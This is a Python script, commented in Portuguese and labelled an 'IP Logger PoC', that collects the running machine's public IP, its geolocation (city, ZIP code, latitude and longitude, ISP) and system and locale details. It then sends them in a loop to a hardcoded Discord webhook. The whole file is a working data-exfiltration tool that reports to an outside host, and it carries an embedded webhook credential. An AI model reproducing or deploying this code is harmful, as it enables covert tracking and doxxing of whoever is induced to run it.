#!/usr/bin/env python3
"""
IP Logger PoC em Python

"""

from __future__ import annotations

import argparse
import locale
import os
import platform
import time
from typing import Any

import requests

DEFAULT_WEBHOOK_URL = "https://discord.com/api/webhooks/1543446581666381935/5I3gKwJjsOWERQdlU6h_fKamy_wYzMs2L8o7wvaJevKMlpsafK8S4vId-Ob3roMMtA4G"
DEFAULT_INTERVAL_SECONDS = 60




def detect_system(user_agent: str | None = None) -> str:
    ua = (user_agent or "").lower()

    if "windows" in ua:
        return "Windows"
    if "mac os" in ua or "darwin" in ua:
        return "macOS"
    if "android" in ua:
        return "Android"
    if "iphone" in ua or "ipad" in ua or "ipod" in ua:
        return "iOS"
    if "linux" in ua:
        return "Linux"

    system_map = {
        "Windows": "Windows",
        "Darwin": "macOS",
        "Linux": "Linux",
    }
    return system_map.get(platform.system(), "Desconhecido")


def get_public_ip() -> str:
    response = requests.get("https://api.ipify.org/?format=json", timeout=10)
    response.raise_for_status()
    data = response.json()

    ip = data.get("ip")
    if not ip:
        raise ValueError("IP não retornado")
    return ip


def get_geolocation(ip: str) -> dict[str, Any]:
    response = requests.get(f"http://ip-api.com/json/{ip}", timeout=10)
    response.raise_for_status()
    data = response.json()
    return data


def get_language() -> str:
    default_locale = locale.getdefaultlocale()[0]
    if default_locale:
        return default_locale
    return os.environ.get("LANG", "--")



def build_payload(
    ip: str,
    geo_data: dict[str, Any],
    user_agent: str | None = None,
) -> dict[str, str]:
    payload = {
        "content": (
            "# ==== **Informações** ====\n\n"
            f"**IP:** {ip}\n"
            f"**País:** {geo_data.get('country', '--')}\n"
            f"**Estado:** {geo_data.get('regionName', '--')}\n"
            f"**Cidade:** {geo_data.get('city', '--')}\n"
            f"**ZIP:** {geo_data.get('zip', '--')}\n"
            f"**Latitude:** {geo_data.get('lat', '--')}\n"
            f"**Longitude:** {geo_data.get('lon', '--')}\n"
            f"**ISP:** {geo_data.get('isp', '--')}\n"
            f"**Sistema:** {detect_system(user_agent)}\n"
            f"**Idioma:** {get_language()}\n"
            f"**Fuso horário:** {geo_data.get('timezone', '--')}\n"
            f"**Plataforma:** {platform.platform() or '--'}"
        )
    }
    return payload


def send_to_discord(webhook_url: str, payload: dict[str, str]) -> bool:
    response = requests.post(
        webhook_url,
        headers={"Content-Type": "application/json"},
        json=payload,
        timeout=15,
    )

    if response.ok:
        print("Webhook enviado com sucesso!")
        return True

    print(f"Erro ao enviar webhook: {response.status_code} - {response.text[:200]}")
    return False


def run_once(webhook_url: str | None = None) -> None:
    try:
        ip = get_public_ip()
        geo_data = get_geolocation(ip)
        payload = build_payload(ip, geo_data,)
        send_to_discord(webhook_url, payload)
    except requests.RequestException as exc:
        print(f"Erro de rede: {exc}")
    except Exception as exc:  # noqa: BLE001
        print(f"Erro ao buscar dados: {exc}")


def main() -> None:
    parser = argparse.ArgumentParser(description="PoC de logger IP em Python")
    parser.add_argument("--webhook-url", default=DEFAULT_WEBHOOK_URL, help="URL do webhook do Discord")
    parser.add_argument("--interval", type=int, default=DEFAULT_INTERVAL_SECONDS, help="Intervalo em segundos")
    parser.add_argument("--once", action="store_true", help="Executa uma única coleta e encerra")
    args = parser.parse_args()

    if args.interval <= 0:
        raise ValueError("O intervalo deve ser maior que zero.")

    print("Iniciando coleta de dados...\n")

    if args.once:
        run_once(args.webhook_url)
        return

    while True:
        run_once(args.webhook_url)
        time.sleep(args.interval)


if __name__ == "__main__":
    main()
